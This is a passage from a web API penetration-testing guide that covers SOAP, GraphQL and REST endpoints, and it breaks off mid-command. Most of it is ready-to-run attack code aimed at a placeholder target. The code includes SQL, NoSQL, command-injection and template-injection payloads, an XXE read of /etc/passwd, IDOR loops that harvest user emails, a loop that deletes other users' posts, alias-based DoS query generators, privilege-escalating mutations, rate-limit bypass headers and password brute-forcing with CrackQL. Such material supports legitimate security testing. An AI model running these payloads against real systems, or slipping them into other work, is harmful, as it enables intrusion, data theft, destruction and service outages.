### SOAP Parameter Tampering

```bash
# Test parameter pollution
cat > param_pollution.xml << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://target.com/">
      <userId>123</userId>
      <userId>456</userId>
      <isAdmin>true</isAdmin>
    </GetUser>
  </soap:Body>
</soap:Envelope>
EOF

curl -X POST https://target.com/service.asmx \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"http://target.com/GetUser\"" \
  -d @param_pollution.xml
```

### SOAP Fuzzing

```python
#!/usr/bin/env python3
# soap_fuzzer.py

import requests
import sys

url = "https://target.com/service.asmx"
soap_action = "http://target.com/GetUser"

# Fuzzing payloads
payloads = [
    "'", '"', "\\", "<", ">", "&", ";",
    "../", "..\\", "/etc/passwd", "C:\\windows\\win.ini",
    "' OR '1'='1", "1' OR '1'='1'--",
    "${7*7}", "{{7*7}}", "<script>alert(1)</script>",
    "<?xml version=\"1.0\"?><!DOCTYPE test [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
]

soap_template = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser xmlns="http://target.com/">
      <userId>{payload}</userId>
    </GetUser>
  </soap:Body>
</soap:Envelope>"""

headers = {
    "Content-Type": "text/xml; charset=utf-8",
    "SOAPAction": f'"{soap_action}"'
}

for payload in payloads:
    soap_body = soap_template.format(payload=payload)
    
    try:
        response = requests.post(url, headers=headers, data=soap_body, timeout=10)
        
        # Analyze response for anomalies
        if response.status_code == 500:
            print(f"[!] Server error with payload: {payload}")
        elif "error" in response.text.lower() or "exception" in response.text.lower():
            print(f"[!] Error message with payload: {payload}")
            print(f"    {response.text[:200]}")
        elif len(response.text) > 1000:  # Unusual response length
            print(f"[+] Large response with payload: {payload}")
            print(f"    Length: {len(response.text)} bytes")
            
    except requests.exceptions.Timeout:
        print(f"[!] Timeout with payload: {payload}")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
```

### Tools & Commands

```bash
# SoapUI - Comprehensive SOAP testing
# Download from https://www.soapui.org/downloads/soapui/

# Burp Suite - SOAP extension
# Extender > BApp Store > Install "WSDL Wizard"

# sqlmap with SOAP
sqlmap -u "https://target.com/service.asmx" \
  --data='<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUser><userId>1*</userId></GetUser></soap:Body></soap:Envelope>' \
  --level=5 \
  --risk=3 \
  -p userId

# wfuzz for SOAP parameter fuzzing
wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt \
  -H "Content-Type: text/xml" \
  -H "SOAPAction: \"GetUser\"" \
  -d '<?xml version="1.0"?><soap:Envelope><soap:Body><GetUser><userId>FUZZ</userId></GetUser></soap:Body></soap:Envelope>' \
  --hc 404 \
  https://target.com/service.asmx
```

## GraphQL Injection and Enumeration

GraphQL is a query language for APIs that allows clients to request exactly the data they need. Its flexibility creates unique security challenges including introspection abuse, injection vulnerabilities, and DoS risks.

### GraphQL Endpoint Discovery

```bash
# Common GraphQL endpoint paths
curl -i https://target.com/graphql
curl -i https://target.com/graphiql
curl -i https://target.com/api/graphql
curl -i https://target.com/v1/graphql
curl -i https://target.com/query
curl -i https://target.com/gql

# Test POST method
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{__typename}"}'

# Test GET method (some implementations)
curl "https://target.com/graphql?query={__typename}"

# Check for GraphQL Playground/GraphiQL interfaces
curl -i https://target.com/graphql \
  -H "Accept: text/html"
```

**Automated GraphQL Discovery**

```bash
# ffuf with GraphQL wordlist
ffuf -u https://target.com/FUZZ \
  -w <(echo -e "graphql\ngraphiql\napi/graphql\nv1/graphql\nquery\ngql\nconsole") \
  -mc 200,400,405 \
  -t 50

# GraphQL-specific fingerprinting
cat > graphql_fingerprint.sh << 'EOF'
#!/bin/bash
urls=(
  "/graphql"
  "/graphiql"
  "/api/graphql"
  "/v1/graphql"
  "/query"
)

for url in "${urls[@]}"; do
  response=$(curl -s -X POST "https://target.com$url" \
    -H "Content-Type: application/json" \
    -d '{"query": "{__typename}"}')
  
  if echo "$response" | grep -q "__typename"; then
    echo "[+] GraphQL found at: $url"
  fi
done
EOF

chmod +x graphql_fingerprint.sh
./graphql_fingerprint.sh
```

### Introspection Queries

GraphQL introspection allows querying the schema structure. This feature is often enabled in production and reveals all available queries, mutations, and types.

**Full Schema Introspection**

```bash
# Basic introspection query
cat > introspection.json << 'EOF'
{
  "query": "{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection.json | jq '.' > schema.json

# Full introspection query (comprehensive)
cat > full_introspection.json << 'EOF'
{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @full_introspection.json | jq '.' > full_schema.json
```

**Extracting Useful Information from Schema**

```bash
# Extract all query names
jq -r '.. | .fields? | select(. != null) | .[].name' schema.json | sort -u > queries.txt

# Extract all type names
jq -r '.data.__schema.types[].name' full_schema.json | grep -v "^__" > types.txt

# Extract queries with arguments (potential injection points)
jq -r '.data.__schema.types[] | select(.name == "Query") | .fields[] | select(.args | length > 0) | .name' full_schema.json

# Extract mutations
jq -r '.data.__schema.types[] | select(.name == "Mutation") | .fields[].name' full_schema.json
```

### GraphQL Enumeration Tools

```bash
# GraphQL Voyager - Visual schema explorer
# Online: https://ivangoncharov.github.io/graphql-voyager/
# Use by uploading introspection result

# InQL - Burp Suite extension for GraphQL
# Extender > BApp Store > Install "InQL"
# Right-click on GraphQL endpoint > Extensions > InQL Scanner

# graphql-playground - Interactive IDE
npm install -g graphql-playground
graphql-playground

# GraphQL IDE - GUI client
# Download from https://github.com/graphql/graphiql
```

**graphw00f - GraphQL Fingerprinting**

```bash
# Install graphw00f
git clone https://github.com/dolevf/graphw00f
cd graphw00f
pip3 install -r requirements.txt

# Fingerprint GraphQL engine
python3 main.py -t https://target.com/graphql

# Test specific endpoint with headers
python3 main.py -t https://target.com/graphql \
  -H "Authorization: Bearer token_here"

# Output results
python3 main.py -t https://target.com/graphql -o fingerprint_results.json
```

**GraphQL-Cop - Security Auditing**

```bash
# Install graphql-cop
npm install -g graphql-cop

# Run security audit
graphql-cop -t https://target.com/graphql

# With authentication
graphql-cop -t https://target.com/graphql \
  -h "Authorization: Bearer token_here"

# Output report
graphql-cop -t https://target.com/graphql -o report.json
```

### GraphQL Injection Attacks

**SQL Injection via GraphQL**

```bash
# Test SQLi in GraphQL query arguments
cat > graphql_sqli.json << 'EOF'
{
  "query": "query { user(id: \"1' OR '1'='1\") { id username email } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_sqli.json

# Time-based blind SQLi
cat > graphql_sqli_time.json << 'EOF'
{
  "query": "query { user(id: \"1' AND SLEEP(5)--\") { id username } }"
}
EOF

time curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_sqli_time.json

# Union-based SQLi
cat > graphql_sqli_union.json << 'EOF'
{
  "query": "query { user(id: \"1' UNION SELECT NULL,username,password,NULL,NULL FROM users--\") { id username email } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_sqli_union.json
```

**NoSQL Injection via GraphQL**

```bash
# MongoDB injection payloads
cat > graphql_nosqli.json << 'EOF'
{
  "query": "query { users(filter: {username: {$ne: null}}) { id username email } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_nosqli.json

# Alternative NoSQL operators
cat > graphql_nosqli_regex.json << 'EOF'
{
  "query": "query { users(filter: {password: {$regex: \".*\"}}) { id username } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_nosqli_regex.json
```

**OS Command Injection**

```bash
# Test command injection in GraphQL arguments
cat > graphql_cmdi.json << 'EOF'
{
  "query": "mutation { uploadFile(filename: \"test.txt; whoami\") { success } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_cmdi.json

# Test with backticks
cat > graphql_cmdi_backtick.json << 'EOF'
{
  "query": "mutation { processFile(path: \"/tmp/`whoami`.txt\") { result } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_cmdi_backtick.json
```

**Server-Side Template Injection (SSTI)**

```bash
# Test SSTI in GraphQL
cat > graphql_ssti.json << 'EOF'
{
  "query": "mutation { createMessage(content: \"{{7*7}}\") { id content } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_ssti.json

# Jinja2 SSTI payload
cat > graphql_ssti_jinja.json << 'EOF'
{
  "query": "mutation { createMessage(content: \"{{config.items()}}\") { id content } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_ssti_jinja.json
```

### GraphQL Injection Testing Script

```python
#!/usr/bin/env python3
# graphql_injection_tester.py

import requests
import json
import time

class GraphQLInjectionTester:
    def __init__(self, url, headers=None):
        self.url = url
        self.headers = headers or {"Content-Type": "application/json"}
        
    def test_sqli(self, query_name, param_name):
        """Test SQL injection payloads"""
        sqli_payloads = [
            "1' OR '1'='1",
            "1' OR '1'='1'--",
            "1' OR '1'='1'/*",
            "1' AND SLEEP(5)--",
            "1' UNION SELECT NULL--",
            "admin'--",
            "' OR 1=1--",
        ]
        
        print(f"[*] Testing SQL injection on {query_name}.{param_name}")
        
        for payload in sqli_payloads:
            query = f'query {{ {query_name}({param_name}: "{payload}") {{ id }} }}'
            data = {"query": query}
            
            start_time = time.time()
            try:
                response = requests.post(self.url, headers=self.headers, 
                                       json=data, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed > 4:  # Time-based detection
                    print(f"[+] Potential time-based SQLi: {payload}")
                    print(f"    Response time: {elapsed:.2f}s")
                
                if response.status_code == 200:
                    resp_json = response.json()
                    if "errors" not in resp_json or len(str(resp_json)) > 500:
                        print(f"[+] Potential SQLi: {payload}")
                        print(f"    Response: {str(resp_json)[:200]}")
                        
            except Exception as e:
                print(f"[!] Error with payload {payload}: {str(e)}")
            
            time.sleep(0.5)
    
    def test_nosqli(self, query_name, param_name):
        """Test NoSQL injection payloads"""
        nosqli_payloads = [
            {"$ne": None},
            {"$ne": ""},
            {"$gt": ""},
            {"$regex": ".*"},
            {"$where": "1==1"},
        ]
        
        print(f"[*] Testing NoSQL injection on {query_name}.{param_name}")
        
        for payload in nosqli_payloads:
            # GraphQL variables approach
            query = f'query($filter: FilterInput) {{ {query_name}({param_name}: $filter) {{ id }} }}'
            data = {
                "query": query,
                "variables": {
                    "filter": payload
                }
            }
            
            try:
                response = requests.post(self.url, headers=self.headers, 
                                       json=data, timeout=10)
                
                if response.status_code == 200:
                    resp_json = response.json()
                    if "errors" not in resp_json:
                        print(f"[+] Potential NoSQLi: {payload}")
                        print(f"    Response: {str(resp_json)[:200]}")
                        
            except Exception as e:
                print(f"[!] Error with payload {payload}: {str(e)}")
    
    def test_cmdi(self, mutation_name, param_name):
        """Test command injection payloads"""
        cmdi_payloads = [
            "; whoami",
            "| whoami",
            "`whoami`",
            "$(whoami)",
            "; sleep 5",
            "| sleep 5",
        ]
        
        print(f"[*] Testing command injection on {mutation_name}.{param_name}")
        
        for payload in cmdi_payloads:
            query = f'mutation {{ {mutation_name}({param_name}: "test{payload}") {{ success }} }}'
            data = {"query": query}
            
            start_time = time.time()
            try:
                response = requests.post(self.url, headers=self.headers, 
                                       json=data, timeout=10)
                elapsed = time.time() - start_time
                
                if elapsed > 4 and "sleep" in payload:
                    print(f"[+] Potential command injection: {payload}")
                    print(f"    Response time: {elapsed:.2f}s")
                
                if response.status_code == 200:
                    resp_text = response.text
                    # Look for command output indicators
                    if any(indicator in resp_text.lower() for indicator in 
                          ['root:', 'uid=', 'gid=', '/home/', '/bin/']):
                        print(f"[+] Potential command injection: {payload}")
                        print(f"    Response: {resp_text[:200]}")
                        
            except Exception as e:
                print(f"[!] Error with payload {payload}: {str(e)}")

# Usage
if __name__ == "__main__":
    url = "https://target.com/graphql"
    headers = {
        "Content-Type": "application/json",
        # "Authorization": "Bearer token_here"
    }
    
    tester = GraphQLInjectionTester(url, headers)
    
    # Test discovered queries/mutations
    tester.test_sqli("user", "id")
    tester.test_nosqli("users", "filter")
    tester.test_cmdi("uploadFile", "filename")
```

### Information Disclosure via GraphQL

**Extracting Sensitive Fields**

```bash
# Request all fields including sensitive ones
cat > graphql_disclosure.json << 'EOF'
{
  "query": "query { users { id username email password passwordHash apiKey internalId ssn creditCard } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_disclosure.json

# Test with fragments for field discovery
cat > graphql_fragments.json << 'EOF'
{
  "query": "query { users { ...UserFields } } fragment UserFields on User { id username email password admin role permissions }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_fragments.json
```

**Field Suggestion/Error-Based Enumeration**

```bash
# Intentionally use wrong field names to trigger suggestions
cat > graphql_suggestions.json << 'EOF'
{
  "query": "query { users { id wrongFieldName } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_suggestions.json | jq '.errors'

# GraphQL often returns helpful error messages like:
# "Cannot query field 'wrongFieldName' on type 'User'. Did you mean 'password'?"
```

### Authorization Bypass

**IDOR via GraphQL**

```bash
# Test accessing other users' data
for user_id in {1..100}; do
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer low_privilege_token" \
    -d "{\"query\": \"query { user(id: $user_id) { id email privateData } }\"}" | \
    jq -r '.data.user.email' | \
    grep -v "null" && echo "[+] IDOR: User $user_id accessible"
done
```

**Alias-Based Authorization Bypass**

```bash
# Use aliases to access restricted fields
cat > graphql_alias_bypass.json << 'EOF'
{
  "query": "query { 
    publicUser: user(id: 1) { id username }
    adminUser: admin(id: 1) { id username email role }
  }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer regular_user_token" \
  -d @graphql_alias_bypass.json
```

**Batch Query Authorization Bypass**

```bash
# Batch multiple queries to bypass rate limiting or access controls
cat > graphql_batch.json << 'EOF'
{
  "query": "query { 
    user1: user(id: 1) { id email }
    user2: user(id: 2) { id email }
    user3: user(id: 3) { id email }
    user4: user(id: 4) { id email }
    user5: user(id: 5) { id email }
  }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_batch.json

# Array-based batching
cat > graphql_array_batch.json << 'EOF'
[
  {"query": "query { user(id: 1) { id email } }"},
  {"query": "query { user(id: 2) { id email } }"},
  {"query": "query { user(id: 3) { id email } }"}
]
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_array_batch.json
```

### GraphQL Denial of Service

**Deeply Nested Queries**

```bash
# Create resource exhaustion with nested queries
cat > graphql_dos_nested.json << 'EOF'
{
  "query": "query { 
    users { 
      posts { 
        comments { 
          author { 
            posts { 
              comments { 
                author { 
                  posts { 
                    comments { 
                      author { 
                        id username 
                      } 
                    } 
                  } 
                } 
              } 
            } 
          } 
        } 
      } 
    } 
  }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_dos_nested.json
```

**Circular Query Fragment DoS**

```bash
# Circular references causing infinite loops
cat > graphql_dos_circular.json << 'EOF'
{
  "query": "query { ...A } fragment A on Query { ...B } fragment B on Query { ...A }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_dos_circular.json
```

**Alias-Based Amplification**

```bash
# Generate script for massive alias DoS
cat > generate_alias_dos.py << 'EOF'
#!/usr/bin/env python3

num_aliases = 10000
query = "query {\n"

for i in range(num_aliases):
    query += f"  user{i}: user(id: 1) {{ id username email }}\n"

query += "}"

with open("graphql_dos_alias.json", "w") as f:
    f.write('{"query": ' + repr(query) + '}')

print(f"[*] Generated query with {num_aliases} aliases")
EOF

python3 generate_alias_dos.py

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_dos_alias.json
```

### GraphQL Mutation Testing

**Mass Assignment via Mutations**

```bash
# Test adding privileged fields in mutations
cat > graphql_mass_assignment.json << 'EOF'
{
  "query": "mutation { 
    createUser(
      username: \"attacker\", 
      email: \"attacker@evil.com\",
      isAdmin: true,
      role: \"administrator\",
      permissions: [\"READ\", \"WRITE\", \"DELETE\"]
    ) { 
      id username isAdmin role 
    } 
  }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_mass_assignment.json

# Update mutation testing
cat > graphql_update_privesc.json << 'EOF'
{
  "query": "mutation { 
    updateUser(
      id: 123,
      isAdmin: true,
      role: \"admin\"
    ) { 
      id username isAdmin 
    } 
  }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer regular_user_token" \
  -d @graphql_update_privesc.json
```

**Delete/Modify Other Users' Data**

```bash
# Test deleting other users' resources
for resource_id in {1..50}; do
  response=$(curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer attacker_token" \
    -d "{\"query\": \"mutation { deletePost(id: $resource_id) { success } }\"}")
  
  if echo "$response" | grep -q "\"success\": true"; then
    echo "[+] Successfully deleted resource $resource_id"
  fi
done
```

### Advanced Enumeration Techniques

**Field Fuzzing**

```python
#!/usr/bin/env python3
# graphql_field_fuzzer.py

import requests
import json

url = "https://target.com/graphql"
headers = {"Content-Type": "application/json"}

# Common sensitive field names
field_names = [
    "password", "passwordHash", "token", "apiKey", "secret",
    "ssn", "creditCard", "privateKey", "internalId",
    "admin", "isAdmin", "role", "permissions", "privileges",
    "email", "phone", "address", "salary", "dob",
    "resetToken", "verificationToken", "sessionId"
]

# Discovered type name (from introspection)
type_name = "User"

print(f"[*] Fuzzing fields on type: {type_name}\n")

for field in field_names:
    query = f'query {{ users {{ id {field} }} }}'
    data = {"query": query}
    
    try:
        response = requests.post(url, headers=headers, json=data, timeout=5)
        resp_json = response.json()
        
        # Check if field exists (no error about unknown field)
        if "errors" in resp_json:
            error_msg = str(resp_json["errors"])
            if "Cannot query field" in error_msg:
                continue  # Field doesn't exist
            else:
                # Other error (might indicate field exists but access denied)
                print(f"[!] {field}: {error_msg[:100]}")
        else:
            # Successful query
            print(f"[+] {field}: ACCESSIBLE")
            if "data" in resp_json and resp_json["data"]:
                print(f"    Sample data: {str(resp_json['data'])[:150]}")
                
    except Exception as e:
        print(f"[!] Error testing {field}: {str(e)}")

print("\n[*] Field fuzzing complete")
```

**Query Complexity Analysis**

```bash
# Test query depth limits
for depth in {5..20}; do
  query="query { users {"
  for ((i=1; i<depth; i++)); do
    query+=" posts { comments {"
  done
  query+=" id "
  for ((i=1; i<depth; i++)); do
    query+="} }"
  done
  query+="} }"
  
  echo "[*] Testing depth: $depth"
  response=$(curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"$query\"}")
  
  if echo "$response" | grep -qi "depth\|complex\|limit"; then
    echo "[!] Depth limit hit at: $depth"
    break
  fi
done
```

### Bypassing GraphQL Protections

**Introspection Bypass Techniques**

```bash
# If introspection is "disabled", try alternative queries

# Method 1: Partial introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"Query\") { fields { name } } }"}'

# Method 2: Type-specific introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Method 3: Directive introspection
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { directives { name description } } }"}'

# Method 4: GET method introspection
curl "https://target.com/graphql?query={__schema{types{name}}}"
```

**Query Cost/Complexity Bypass**

```bash
# Use fragments to reduce apparent complexity
cat > graphql_fragment_bypass.json << 'EOF'
{
  "query": "fragment UserData on User { id username email posts { id title } } query { user1: user(id: 1) { ...UserData } user2: user(id: 2) { ...UserData } user3: user(id: 3) { ...UserData } }"
}
EOF

curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @graphql_fragment_bypass.json
```

### Comprehensive GraphQL Testing Tool

```bash
# GraphQL Playground - Interactive testing
npm install -g graphql-playground

# Altair GraphQL Client - Feature-rich GUI
# Download from: https://altair.sirmuel.design/

# Insomnia - REST/GraphQL client
# Download from: https://insomnia.rest/

# graphql-path-enum - Automated enumeration
npm install -g graphql-path-enum
graphql-path-enum https://target.com/graphql

# CrackQL - GraphQL password spraying/brute force
git clone https://github.com/nicholasaleks/CrackQL
cd CrackQL
python3 CrackQL.py -t https://target.com/graphql \
  -q login_query.txt \
  -i users.txt \
  -p passwords.txt
```

### Tools Summary

```bash
# Essential GraphQL testing toolkit

# 1. GraphQL-specific tools
npm install -g graphql-cli graphql-playground graphql-voyager

# 2. Burp Suite extensions
# - InQL Scanner
# - GraphQL Raider

# 3. Automated scanners
pip3 install graphql-core
git clone https://github.com/dolevf/graphw00f
git clone https://github.com/nicholasaleks/CrackQL

# 4. Command-line tools
go install github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest
# Use with GraphQL templates

# 5. Custom scripts (Python)
pip3 install requests gql
```

### Related Topics for Further Study

- **GraphQL Subscriptions** - WebSocket-based real-time updates with unique attack vectors
- **GraphQL Federation** - Microservice architectures exposing additional complexity
- **Persisted Queries** - Query whitelisting bypass techniques
- **GraphQL File Upload** - Multipart request vulnerabilities and file upload attacks

---

## Insecure API Endpoints

Insecure API endpoints lack proper authentication, authorization, rate limiting, or input validation. These vulnerabilities arise from developers assuming APIs are not directly accessible or from inconsistent security policies across API versions.

### Discovery and Enumeration

**Endpoint Discovery via Documentation**

```bash
# Common API documentation paths
curl https://target.com/api/docs
curl https://target.com/swagger.json
curl https://target.com/api/swagger-ui.html
curl https://target.com/v1/api-docs
curl https://target.com/openapi.json
curl https://target.com/api/v1/documentation
curl https://target.com/graphql # GraphQL playground
curl https://target.com/api/schema
```

**Automated API Discovery**

```bash
# Using kiterunner for API endpoint discovery
kr scan https://target.com -w /opt/kiterunner/routes-large.kite -x 20

# Using ffuf with API wordlists
ffuf -u https://target.com/api/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,204,301,302,401,403 \
  -o api_endpoints.json -of json

# Using gobuster for API paths
gobuster dir -u https://target.com/api \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50 -b 404 --wildcard -o api_paths.txt
```

**Version Discovery** APIs often maintain multiple versions with varying security postures.

```bash
# Test common version patterns
for v in v1 v2 v3 v4 1 2 3 api/v1 api/v2; do
  curl -s "https://target.com/$v/users" | head -n 5
  curl -s "https://target.com/api/$v/users" | head -n 5
done

# Test version in headers
curl https://target.com/api/users -H "Accept: application/vnd.api+json;version=1"
curl https://target.com/api/users -H "X-API-Version: 1"
```

### Authentication and Authorization Bypass

**Missing Authentication** Test if endpoints respond without credentials.

```bash
# Test without authentication
curl -X GET https://target.com/api/users
curl -X GET https://target.com/api/v1/admin/users
curl -X GET https://target.com/api/internal/config

# Test with invalid/expired tokens
curl -X GET https://target.com/api/users \
  -H "Authorization: Bearer invalid_token_here"
```

**IDOR in API Endpoints** Direct object references are common in RESTful APIs.

```bash
# Enumerate user resources
for id in {1..1000}; do
  curl -s "https://target.com/api/users/$id" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    | grep -E "email|username" >> found_users.txt
done

# Test UUID enumeration (if predictable)
curl "https://target.com/api/orders/00000000-0000-0000-0000-000000000001"
curl "https://target.com/api/orders/00000000-0000-0000-0000-000000000002"
```

**HTTP Method Tampering** APIs may implement authorization checks inconsistently across HTTP methods.

```bash
# If GET is protected but PUT/DELETE are not
curl -X GET https://target.com/api/users/123 
# Returns 403

curl -X DELETE https://target.com/api/users/123 \
  -H "Authorization: Bearer YOUR_TOKEN"
# May succeed

# Test all methods
for method in GET POST PUT DELETE PATCH OPTIONS HEAD; do
  echo "Testing $method:"
  curl -X $method "https://target.com/api/users/123" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -w "\nStatus: %{http_code}\n\n"
done
```

**Path Traversal in API Routes**

```bash
# Test path manipulation
curl "https://target.com/api/users/../admin/users"
curl "https://target.com/api/users/123/../../config"
curl "https://target.com/api/v1/users/../../v2/admin/users"

# URL encoding variations
curl "https://target.com/api/users%2f..%2fadmin%2fusers"
curl "https://target.com/api/users%2f%2e%2e%2fadmin%2fusers"
```

### Information Disclosure

**Verbose Error Messages** Trigger errors to extract information about backend systems.

```bash
# Test invalid data types
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"age": "not_a_number"}'

# Test SQL injection in API to trigger database errors
curl "https://target.com/api/users?id=1'" -v

# Test XXE in XML APIs
curl -X POST https://target.com/api/process \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'
```

**Excessive Data Exposure** APIs may return more data than necessary.

```bash
# Compare web UI data vs API data
# Web shows: username, email
# API returns:
curl https://target.com/api/users/123 | jq .
# May include: password_hash, internal_id, permissions, etc.

# Test filtering bypass
curl "https://target.com/api/users?fields=*"
curl "https://target.com/api/users?select=*"
curl "https://target.com/api/users?include=password,ssn,internal_notes"
```

**Debug Endpoints**

```bash
# Common debug/test endpoints
curl https://target.com/api/debug
curl https://target.com/api/test
curl https://target.com/api/health -v
curl https://target.com/api/status -v
curl https://target.com/api/metrics
curl https://target.com/api/actuator/env
curl https://target.com/api/actuator/mappings
```

### Rate Limiting Bypass

**Header-Based Bypass**

```bash
# Test various bypass headers
curl https://target.com/api/users \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "X-Real-IP: 1.2.3.4" \
  -H "X-Originating-IP: 1.2.3.4" \
  -H "X-Remote-IP: 1.2.3.4" \
  -H "X-Client-IP: 1.2.3.4"

# Rotate IPs in script
for i in {1..100}; do
  curl https://target.com/api/data \
    -H "X-Forwarded-For: 10.0.0.$i"
done
```

**Endpoint Variation** [Inference] Rate limits may be applied per-endpoint rather than globally.

```bash
# If /api/users is rate-limited, try:
curl https://target.com/api/v1/users
curl https://target.com/api/v2/users
curl https://target.com/API/users  # Case variation
curl https://target.com/api/users/
curl https://target.com/api/users.json
```

### Testing Workflow

**1. Baseline Reconnaissance**

```bash
# Identify API technology
curl -I https://target.com/api/users

# Common headers indicating API framework:
# X-Powered-By: Express
# Server: Werkzeug/2.0.1 Python/3.9.5
# X-AspNet-Version: 4.0.30319

# Test for API gateway
curl -I https://target.com/api/users | grep -i "kong\|tyk\|apigee\|aws"
```

**2. Automated Scanning**

```bash
# Using OWASP ZAP API scan
zap-cli quick-scan --self-contained --start-options '-config api.key=YOUR_KEY' \
  https://target.com/api

# Using Nuclei with API templates
nuclei -u https://target.com -t ~/nuclei-templates/exposures/apis/

# Custom script for endpoint fuzzing
cat > api_fuzz.sh << 'EOF'
#!/bin/bash
while IFS= read -r endpoint; do
  for method in GET POST PUT DELETE PATCH; do
    response=$(curl -s -o /dev/null -w "%{http_code}" -X $method "https://target.com/api/$endpoint")
    if [ "$response" != "404" ] && [ "$response" != "405" ]; then
      echo "$method /api/$endpoint - HTTP $response"
    fi
  done
done < api_endpoints.txt
EOF
chmod +x api_fuzz.sh
```

**3. Authentication Token Analysis**

```bash
# JWT token inspection
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test for none algorithm vulnerability
python3 << EOF
import jwt
token = jwt.encode({"user": "admin", "role": "admin"}, None, algorithm="none")
print(token)
EOF

# Brute force JWT secret
jwt-cracker "eyJhbGc..." /usr/share/wordlists/rockyou.txt
```

## Mass Assignment in APIs

Mass assignment occurs when API endpoints accept client-provided data and bind it directly to internal objects without filtering, allowing modification of unintended fields.

### Vulnerability Identification

**Parameter Discovery**

```bash
# Send a valid request first
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"username":"test","email":"test@test.com"}' -v

# Add common privileged parameters
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"test2","email":"test2@test.com","role":"admin","isAdmin":true,"admin":true,"is_admin":true}'

# Using param-miner (Burp extension approach, manual equivalent):
# Test with additional fields
curl -X POST https://target.com/api/users \
  -H "Content-Type: application/json" \
